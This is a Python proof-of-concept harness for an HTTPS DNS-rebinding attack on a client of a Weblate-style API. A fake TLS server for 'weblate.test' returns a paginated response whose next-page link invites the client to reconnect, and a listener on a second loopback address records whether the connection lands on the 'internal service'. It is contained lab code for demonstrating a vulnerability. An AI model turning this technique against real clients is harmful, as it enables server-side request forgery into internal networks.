"""HTTPS variant of the rebinding PoC.

127.0.0.1:PORT - attacker front-end, valid TLS for weblate.test
127.0.0.2:PORT - internal service, raw listener that records what arrives
"""

import json
import socket
import ssl
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8443
CERT = sys.argv[2] if len(sys.argv) > 2 else "poc/cert.pem"
KEY = sys.argv[3] if len(sys.argv) > 3 else "poc/key.pem"
HOSTNAME = "weblate.test"


class WeblateHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def do_GET(self):  # noqa: N802
        body = json.dumps(
            {
                "count": 2,
                "next": f"https://{HOSTNAME}:{PORT}/api/projects/?page=2",
                "previous": None,
                "results": [],
            }
        ).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)
        print(f"[weblate ] served {self.path} over TLS", flush=True)

    def log_message(self, *args):
        pass


def internal_listener():
    """Record any TCP connection reaching the internal address."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("127.0.0.2", PORT))
    sock.listen(5)
    while True:
        conn, peer = sock.accept()
        print(f"\n[internal] !!! TCP connection from {peer[0]}:{peer[1]} !!!", flush=True)
        conn.settimeout(3)
        try:
            data = conn.recv(4096)
        except OSError:
            data = b""
        if data[:1] == b"\x16":
            sni = b"weblate.test" in data
            print(
                f"[internal] TLS ClientHello, {len(data)} bytes, SNI weblate.test present: {sni}",
                flush=True,
            )
        else:
            print(f"[internal] plaintext: {data[:200]!r}", flush=True)
        conn.close()


if __name__ == "__main__":
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(CERT, KEY)
    server = ThreadingHTTPServer(("127.0.0.1", PORT), WeblateHandler)
    server.socket = context.wrap_socket(server.socket, server_side=True)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    threading.Thread(target=internal_listener, daemon=True).start()
    print(f"[setup] TLS front-end     https://127.0.0.1:{PORT}", flush=True)
    print(f"[setup] internal listener 127.0.0.2:{PORT}", flush=True)
    threading.Event().wait()
